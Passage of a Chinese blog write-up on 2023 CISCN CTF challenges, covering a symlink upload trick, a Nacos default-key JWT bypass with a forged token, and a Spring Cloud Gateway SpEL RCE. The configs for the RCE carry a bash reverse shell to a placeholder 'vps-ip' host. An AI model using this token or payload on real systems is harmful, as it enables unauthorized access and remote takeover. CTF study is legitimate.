@@ -1,0 +1,733 @@
+<!DOCTYPE html>
+<html lang='en' dir='auto'><head>
+  <meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'>
+<meta name='description' content='2023CISCN初赛题目复现 Unzip 题型：文件上传（软连接）
+点击上传，跳转到upload.php，高亮源码
+软连接
+依次上传 1.zip、2.zip
+BackendService 题型：nacos身份认证漏洞&#43;Nacos结合Spring Cloud Gateway RCE利用
+nacos身份认证漏洞 这里用的 QVD-2023-6271 nacos token.secret.key身份认证绕过漏洞
+影响版本：0.1.0&lt;= Nacos&lt;= 2.2.0
+默认密钥
+SecretKey012345678901234567890123456789012345678901234567890123456789 exp为时间戳，大于当前时间即可
+发送到重放模块，添加Authorization: Bearer
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MjU1NjAyODgwMH0.qortgrr-UfhqQ-G9AWstQO-azRecm_b84uonXmYDMqo 登入系统
+Nacos结合Spring Cloud Gateway RCE利用 该漏洞在网上公开POC的利用方式是通过/actuator/gateway/routes这个节点进行动态添加路由的，当项目配置文件中配置了以下两行配置时（YAML格式），便会开启该接口：
+## application.yaml management.endpoint.gateway.enabled: true # default value management.endpoints.web.exposure.include: gateway 题目中的backcfg服务节点（就是nacos服务本身，两者是同一个机器）加载配置文件的话就可以在控制台创建backcfg.json配置，之后backcfg服务节点就会自动导入配置。Nacos结合Spring Cloud Gateway RCE利用配置文件gateway，如果发现应用未开启Actuator，则结合前文所说的利用响应包增加Header的方式回显，将配置在Nacos中进行修改
+spring: cloud: gateway: routes: - id: exam order: 0 uri: lb://service-provider predicates: - Path=/echo/** filters: - name: AddResponseHeader args: name: result value: &#34;#{new java.'>
+<meta name='theme-color' content='#00ffff'>
+
+<meta property='og:title' content='2023CISCN初赛题目复现 • '>
+<meta property='og:description' content='2023CISCN初赛题目复现 Unzip 题型：文件上传（软连接）
+点击上传，跳转到upload.php，高亮源码
+软连接
+依次上传 1.zip、2.zip
+BackendService 题型：nacos身份认证漏洞&#43;Nacos结合Spring Cloud Gateway RCE利用
+nacos身份认证漏洞 这里用的 QVD-2023-6271 nacos token.secret.key身份认证绕过漏洞
+影响版本：0.1.0&lt;= Nacos&lt;= 2.2.0
+默认密钥
+SecretKey012345678901234567890123456789012345678901234567890123456789 exp为时间戳，大于当前时间即可
+发送到重放模块，添加Authorization: Bearer
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MjU1NjAyODgwMH0.qortgrr-UfhqQ-G9AWstQO-azRecm_b84uonXmYDMqo 登入系统
+Nacos结合Spring Cloud Gateway RCE利用 该漏洞在网上公开POC的利用方式是通过/actuator/gateway/routes这个节点进行动态添加路由的，当项目配置文件中配置了以下两行配置时（YAML格式），便会开启该接口：
+## application.yaml management.endpoint.gateway.enabled: true # default value management.endpoints.web.exposure.include: gateway 题目中的backcfg服务节点（就是nacos服务本身，两者是同一个机器）加载配置文件的话就可以在控制台创建backcfg.json配置，之后backcfg服务节点就会自动导入配置。Nacos结合Spring Cloud Gateway RCE利用配置文件gateway，如果发现应用未开启Actuator，则结合前文所说的利用响应包增加Header的方式回显，将配置在Nacos中进行修改
+spring: cloud: gateway: routes: - id: exam order: 0 uri: lb://service-provider predicates: - Path=/echo/** filters: - name: AddResponseHeader args: name: result value: &#34;#{new java.'>
+<meta property='og:url' content='https://n2ryx.github.io/docs/java/ctf/2023ciscn%E5%88%9D%E8%B5%9B%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/'>
+<meta property='og:site_name' content='n2ryx&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='docs'><meta property='article:tag' content='CTF'><meta property='article:published_time' content='2024-01-20T00:00:00Z'/><meta property='article:modified_time' content='2024-01-20T00:00:00Z'/><meta name='twitter:card' content='summary'>
+
+<meta name="generator" content="Hugo 0.120.3">
+
+  <title>2023CISCN初赛题目复现 • </title>
+  <link rel='canonical' href='https://n2ryx.github.io/docs/java/ctf/2023ciscn%E5%88%9D%E8%B5%9B%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/'>
+  
+  
+  <link rel='icon' href='/favicon.ico'>
+<link rel='stylesheet' href='/assets/css/main.ab98e12b.css'><link rel='stylesheet' href='/css/custom.css'><style>
+:root{--color-accent:#00ffff;}
+</style>
+
+  
+
+</head>
+<body class='page type-docs has-sidebar'>
+
+  <div class='site'><div id='sidebar' class='sidebar'>
+  <a class='screen-reader-text' href='#main-menu'>Skip to Main Menu</a>
+
+  <div class='container'><section class='widget widget-about sep-after'>
+  <header>
+    
+    <div class='logo'>
+      <a href='/'>
+        <img src='/images/logo.png'>
+      </a>
+    </div>
+    
+    <h2 class='title site-title '>
+      <a href='/'>
+      n2ryx&#39;s Blog
+      </a>
+    </h2>
+    <div class='desc'>
+    记录和分享
+    </div>
+  </header>
+
+</section>
+<section class='widget widget-search sep-after'>
+  <header>
+    <h4 class='title widget-title'>Search</h4>
+  </header>
+
+  <form action='/search' id='search-form' class='search-form'>
+    <label>
+      <span class='screen-reader-text'>Search</span>
+      <input id='search-term' class='search-term' type='search' name='q' placeholder='Search&hellip;'>
+    </label></form>
+
+</section>
+<section class='widget widget-sidebar_menu sep-after'><nav id='sidebar-menu' class='menu sidebar-menu' aria-label='Sidebar Menu'>
+    <div class='container'>
+      <ul><li class='item'>
+  <a href='/'>主页</a></li><li class='item has-current'>
+  <a href='/docs/'>文档</a></li><li class='item'>
+  <a href='/archive/'>归档</a></li><li class='item'>
+  <a href='/about/'>关于</a></li></ul>
+    </div>
+  </nav>
+
+</section><section class='widget widget-taxonomy_cloud sep-after'>
+  <header>
+    <h4 class='title widget-title'>Tags</h4>
+  </header>
+
+  <div class='container list-container'>
+  <ul class='list taxonomy-cloud'><li>
+        <a href='/tags/ctf/' style='font-size:1em'>CTF</a>
+      </li><li>
+        <a href='/tags/javabase/' style='font-size:1.4285714285714286em'>JavaBase</a>
+      </li><li>
+        <a href='/tags/javagadget/' style='font-size:2em'>JavaGadget</a>
+      </li><li>
+        <a href='/tags/vulrecurrent/' style='font-size:1.2857142857142856em'>VulRecurrent</a>
+      </li></ul>
+</div>
+
+
+</section>
+</div>
+
+  <div class='sidebar-overlay'></div>
+</div><div class='main'><a class='screen-reader-text' href='#content'>Skip to Content</a>
+
+<button id='sidebar-toggler' class='sidebar-toggler' aria-controls='sidebar'>
+  <span class='screen-reader-text'>Toggle Sidebar</span>
+  <span class='open'><svg
+  class="icon"
+  xmlns="http://www.w3.org/2000/svg"
+  viewbox="0 0 24 24"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  stroke-width="2"
+  aria-hidden="true"
+><line x1="3" y1="12" x2="21" y2="12" />
+<line x1="3" y1="6" x2="21" y2="6" />
+<line x1="3" y1="18" x2="21" y2="18" />
+</svg>
+</span>
+  <span class='close'><svg
+  class="icon"
+  xmlns="http://www.w3.org/2000/svg"
+  viewbox="0 0 24 24"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  stroke-width="2"
+  aria-hidden="true"
+><line x1="18" y1="6" x2="6" y2="18" />
+<line x1="6" y1="6" x2="18" y2="18" />
+</svg>
+</span>
+</button><div class='header-widgets'>
+        <div class='container'>
+    
+    <style>.widget-breadcrumbs li:after{content:'\2f '}</style>
+  <section class='widget widget-breadcrumbs sep-after'>
+    <nav id='breadcrumbs'>
+      <ol><li><a href='/'>主页</a></li><li><a href='/docs/'>文档</a></li><li><span>2023CISCN初赛题目复现</span></li></ol>
+    </nav>
+  </section></div>
+      </div>
+
+      <header id='header' class='header site-header'>
+        <div class='container sep-after'>
+          <div class='header-info'><p class='site-title title'>n2ryx&#39;s Blog</p><p class='desc site-desc'>记录和分享</p>
+          </div>
+        </div>
+      </header>
+
+      <main id='content'>
+
+
+<article lang='en' class='entry'>
+  <header class='header entry-header'>
+  <div class='container sep-after'>
+    <div class='header-info'>
+      <h1 class='title'>2023CISCN初赛题目复现</h1>
+      
+
+    </div>
+    <div class='entry-meta'>
+  <span class='posted-on'><svg
+  class="icon"
+  xmlns="http://www.w3.org/2000/svg"
+  viewbox="0 0 24 24"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  stroke-width="2"
+  aria-hidden="true"
+><rect x="3" y="4" width="18" height="18" rx="2" ry="2" />
+<line x1="16" y1="2" x2="16" y2="6" />
+<line x1="8" y1="2" x2="8" y2="6" />
+<line x1="3" y1="10" x2="21" y2="10" />
+</svg>
+<span class='screen-reader-text'>Posted on </span>
+  <time class='entry-date' datetime='2024-01-20T00:00:00Z'>2024, Jan 20</time>
+</span>
+
+  <span class='byline'><svg
+  class="icon"
+  xmlns="http://www.w3.org/2000/svg"
+  viewbox="0 0 24 24"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  stroke-width="2"
+  aria-hidden="true"
+><path d="M21,21V20c0-2.76-4-5-9-5s-9,2.24-9,5v1" />
+<path d="M16,6.37A4,4,0,1,1,12.63,3,4,4,0,0,1,16,6.37Z" />
+</svg>
+<span class='screen-reader-text'> by </span><a href='/authors/%3cnil%3e'></a></span>
+  
+
+</div>
+
+
+  </div>
+</header>
+
+  
+  
+
+  <div class='container entry-content'>
+  <h2 id="2023ciscn初赛题目复现">2023CISCN初赛题目复现</h2>
+<h3 id="unzip">Unzip</h3>
+<p>题型：文件上传（软连接）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20240326122623734.png" alt="image-20240326122623734"></p>
+<p>点击上传，跳转到upload.php，高亮源码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20240326122625315.png" alt="image-20240326122625315"></p>
+<p>软连接</p>
+<p><img src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20240326123325173.png" alt="image-20240326123325173"></p>
+<p>依次上传 1.zip、2.zip</p>
+<p><img src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20240326123701286.png" alt="image-20240326123701286"></p>
+<h3 id="backendservice">BackendService</h3>
+<p>题型：nacos身份认证漏洞+Nacos结合Spring Cloud Gateway RCE利用</p>
+<h4 id="nacos身份认证漏洞">nacos身份认证漏洞</h4>
+<p>这里用的 QVD-2023-6271 nacos token.secret.key身份认证绕过漏洞</p>
+<p>影响版本：0.1.0&lt;= Nacos&lt;= 2.2.0</p>
+<p><img src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20240326213857112.png" alt="image-20240326213857112"></p>
+<p>默认密钥</p>
+<pre tabindex="0"><code class="language-fallback" data-lang="fallback">SecretKey012345678901234567890123456789012345678901234567890123456789
+</code></pre><p>exp为时间戳，大于当前时间即可</p>
+<p><img src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20240326214023826.png" alt="image-20240326214023826"></p>
+<p>发送到重放模块，添加Authorization: Bearer</p>
+<pre tabindex="0"><code>Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MjU1NjAyODgwMH0.qortgrr-UfhqQ-G9AWstQO-azRecm_b84uonXmYDMqo
+</code></pre><p><img src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20240326214430882.png" alt="image-20240326214430882"></p>
+<p>登入系统</p>
+<p><img src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20240326214455398.png" alt="image-20240326214455398"></p>
+<h4 id="nacos结合spring-cloud-gateway-rce利用httpsxzaliyuncomt11493toc-5"><a href="https://xz.aliyun.com/t/11493#toc-5">Nacos结合Spring Cloud Gateway RCE利用</a></h4>
+<p>该漏洞在网上公开POC的利用方式是通过/actuator/gateway/routes这个节点进行动态添加路由的，当项目配置文件中配置了以下两行配置时（YAML格式），便会开启该接口：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#75715e">## application.yaml</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">management.endpoint.gateway.enabled</span>: <span style="color:#66d9ef">true</span> <span style="color:#75715e"># default value</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">management.endpoints.web.exposure.include</span>: <span style="color:#ae81ff">gateway</span>
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20240327132354140.png" alt="image-20240327132354140"></p>
+<p>题目中的backcfg服务节点（就是nacos服务本身，两者是同一个机器）加载配置文件的话就可以在控制台创建backcfg.json配置，之后backcfg服务节点就会自动导入配置。<a href="https://xz.aliyun.com/t/11493#toc-5">Nacos结合Spring Cloud Gateway RCE利用</a><code>配置文件gateway，如果发现应用未开启Actuator，则结合前文所说的利用响应包增加Header的方式回显，将配置在Nacos中进行修改</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20240327132550145.png" alt="image-20240327132550145"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">spring</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">cloud</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">gateway</span>:
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">routes</span>:
+</span></span><span style="display:flex;"><span>        - <span style="color:#f92672">id</span>: <span style="color:#ae81ff">exam</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">order</span>: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">uri</span>: <span style="color:#ae81ff">lb://service-provider</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">predicates</span>:
+</span></span><span style="display:flex;"><span>            - <span style="color:#ae81ff">Path=/echo/**</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">filters</span>:
+</span></span><span style="display:flex;"><span>            - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">AddResponseHeader</span>
+</span></span><span style="display:flex;"><span>              <span style="color:#f92672">args</span>:
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">name</span>: <span style="color:#ae81ff">result</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">value</span>: <span style="color:#e6db74">&#34;#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{&#39;bash&#39;, &#39;-c&#39;, &#39;bash -i &gt;&amp; /dev/tcp/vps-ip/6666 0&gt;&amp;1&#39;}).getInputStream())).replaceAll(&#39;\n&#39;,&#39;&#39;).replaceAll(&#39;\r&#39;,&#39;&#39;)}&#34;</span>
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20240327135741495.png" alt="image-20240327135741495"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20240326215608435.png" alt="image-20240326215608435"></p>
+<p>上面是yaml格式，不过很多博客讲要用json格式（json也可以）</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;spring&#34;</span>: {
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;cloud&#34;</span>: {
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;gateway&#34;</span>: {
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&#34;routes&#34;</span>: [
+</span></span><span style="display:flex;"><span>                    {
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">&#34;id&#34;</span>: <span style="color:#e6db74">&#34;exam&#34;</span>,
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">&#34;order&#34;</span>: <span style="color:#ae81ff">0</span>,
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">&#34;uri&#34;</span>: <span style="color:#e6db74">&#34;http://example.com/&#34;</span>,
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">&#34;predicates&#34;</span>: [
+</span></span><span style="display:flex;"><span>                            <span style="color:#e6db74">&#34;Path=/echo/**&#34;</span>
+</span></span><span style="display:flex;"><span>                        ],
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">&#34;filters&#34;</span>: [
+</span></span><span style="display:flex;"><span>                            {
+</span></span><span style="display:flex;"><span>                                <span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;AddResponseHeader&#34;</span>,
+</span></span><span style="display:flex;"><span>                                <span style="color:#f92672">&#34;args&#34;</span>: {
+</span></span><span style="display:flex;"><span>                                    <span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;result&#34;</span>,
+</span></span><span style="display:flex;"><span>                                    <span style="color:#f92672">&#34;value&#34;</span>: <span style="color:#e6db74">&#34;#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{&#39;bash&#39;, &#39;-c&#39;, &#39;bash -i &gt;&amp; /dev/tcp/vps-ip/6666 0&gt;&amp;1&#39;}).getInputStream())).replaceAll(&#39;\n&#39;,&#39;&#39;).replaceAll(&#39;\r&#39;,&#39;&#39;)}&#34;</span>
+</span></span><span style="display:flex;"><span>                                }
+</span></span><span style="display:flex;"><span>                            }
+</span></span><span style="display:flex;"><span>                        ]
+</span></span><span style="display:flex;"><span>                    }
+</span></span><span style="display:flex;"><span>                ]
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="go_session">go_session</h3>
+<p>题型：go的session伪造+pongo2模板注入</p>
+<p>没有深入</p>
+<h4 id="代码审计">代码审计</h4>
+<p>main.go</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">package</span> <span style="color:#a6e22e">main</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> (
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;github.com/gin-gonic/gin&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;main/route&#34;</span>
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">r</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">gin</span>.<span style="color:#a6e22e">Default</span>()
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">GET</span>(<span style="color:#e6db74">&#34;/&#34;</span>, <span style="color:#a6e22e">route</span>.<span style="color:#a6e22e">Index</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">GET</span>(<span style="color:#e6db74">&#34;/admin&#34;</span>, <span style="color:#a6e22e">route</span>.<span style="color:#a6e22e">Admin</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">GET</span>(<span style="color:#e6db74">&#34;/flask&#34;</span>, <span style="color:#a6e22e">route</span>.<span style="color:#a6e22e">Flask</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">Run</span>(<span style="color:#e6db74">&#34;0.0.0.0:80&#34;</span>)
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>route.go</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">package</span> <span style="color:#a6e22e">route</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> (
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;github.com/flosch/pongo2/v6&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;github.com/gin-gonic/gin&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;github.com/gorilla/sessions&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;html&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;io&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;net/http&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;os&#34;</span>
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">store</span> = <span style="color:#a6e22e">sessions</span>.<span style="color:#a6e22e">NewCookieStore</span>([]byte(<span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">Getenv</span>(<span style="color:#e6db74">&#34;SESSION_KEY&#34;</span>)))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">Index</span>(<span style="color:#a6e22e">c</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">gin</span>.<span style="color:#a6e22e">Context</span>) {  <span style="color:#75715e">// 判断是否携带了cookie，如果cookie中的name为空，就将其设置为guest
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">session</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">store</span>.<span style="color:#a6e22e">Get</span>(<span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">Request</span>, <span style="color:#e6db74">&#34;session-name&#34;</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">Error</span>(<span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">Writer</span>, <span style="color:#a6e22e">err</span>.<span style="color:#a6e22e">Error</span>(), <span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">StatusInternalServerError</span>)
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span>
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">session</span>.<span style="color:#a6e22e">Values</span>[<span style="color:#e6db74">&#34;name&#34;</span>] <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">session</span>.<span style="color:#a6e22e">Values</span>[<span style="color:#e6db74">&#34;name&#34;</span>] = <span style="color:#e6db74">&#34;guest&#34;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">err</span> = <span style="color:#a6e22e">session</span>.<span style="color:#a6e22e">Save</span>(<span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">Request</span>, <span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">Writer</span>)
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">Error</span>(<span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">Writer</span>, <span style="color:#a6e22e">err</span>.<span style="color:#a6e22e">Error</span>(), <span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">StatusInternalServerError</span>)
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span>
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">String</span>(<span style="color:#ae81ff">200</span>, <span style="color:#e6db74">&#34;Hello, &#34;</span>)
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">Admin</span>(<span style="color:#a6e22e">c</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">gin</span>.<span style="color:#a6e22e">Context</span>) {  <span style="color:#75715e">// 获取session中的name的值，若不为admin则后续无法进行，因此需要过的第一关是对session进行伪造，后续是pongo2的ssti
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">session</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">store</span>.<span style="color:#a6e22e">Get</span>(<span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">Request</span>, <span style="color:#e6db74">&#34;session-name&#34;</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">Error</span>(<span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">Writer</span>, <span style="color:#a6e22e">err</span>.<span style="color:#a6e22e">Error</span>(), <span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">StatusInternalServerError</span>)
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span>
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">session</span>.<span style="color:#a6e22e">Values</span>[<span style="color:#e6db74">&#34;name&#34;</span>] <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;admin&#34;</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">Error</span>(<span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">Writer</span>, <span style="color:#e6db74">&#34;N0&#34;</span>, <span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">StatusInternalServerError</span>)
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span>
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">name</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">DefaultQuery</span>(<span style="color:#e6db74">&#34;name&#34;</span>, <span style="color:#e6db74">&#34;ssti&#34;</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">xssWaf</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">html</span>.<span style="color:#a6e22e">EscapeString</span>(<span style="color:#a6e22e">name</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">tpl</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">pongo2</span>.<span style="color:#a6e22e">FromString</span>(<span style="color:#e6db74">&#34;Hello &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">xssWaf</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;!&#34;</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+</span></span><span style="display:flex;"><span>		panic(<span style="color:#a6e22e">err</span>)
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">out</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">tpl</span>.<span style="color:#a6e22e">Execute</span>(<span style="color:#a6e22e">pongo2</span>.<span style="color:#a6e22e">Context</span>{<span style="color:#e6db74">&#34;c&#34;</span>: <span style="color:#a6e22e">c</span>})
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">Error</span>(<span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">Writer</span>, <span style="color:#a6e22e">err</span>.<span style="color:#a6e22e">Error</span>(), <span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">StatusInternalServerError</span>)
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span>
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">String</span>(<span style="color:#ae81ff">200</span>, <span style="color:#a6e22e">out</span>)
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
